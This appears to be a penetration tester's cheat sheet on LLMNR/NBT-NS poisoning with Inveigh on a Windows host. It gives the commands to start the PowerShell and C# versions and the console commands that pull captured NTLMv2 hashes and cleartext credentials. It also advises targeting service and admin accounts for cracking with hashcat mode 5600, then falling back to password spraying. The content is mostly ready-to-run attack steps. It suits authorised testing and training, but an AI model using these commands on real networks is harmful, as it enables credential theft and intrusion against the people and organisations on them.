# LLMNR/NBT-NS Poisoning — Windows (Inveigh)

On a Windows attack host or after landing local admin on a domain-joined box.

PowerShell version (legacy, no longer updated) — LLMNR + NBNS + file output:

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

C# version (maintained, preferred) — defaults are sane, just run it:

```powershell
.\Inveigh.exe
```

Output lands in `C:\Tools` by default. HTTP listener will fail if port 80 is already bound — doesn't stop the rest.

Hit `ESC` to drop into interactive console mid-run. Key commands:

- `GET NTLMV2UNIQUE` — deduplicated hashes ready to copy out
- `GET NTLMV2USERNAMES` — user → IP → challenge mapping, useful for prioritizing who to crack
- `GET CLEARTEXT` — if anything came in cleartext
- `STOP` — kill it

> [!tip] Check `GET NTLMV2USERNAMES` before cracking everything — identify high-value accounts (svc_, admin, DA) and crack those first.

Hashes from Inveigh → same hashcat mode 5600 pipeline as Responder. No PTH with NTLMv2.

No hashes or nothing cracks → move to password spraying.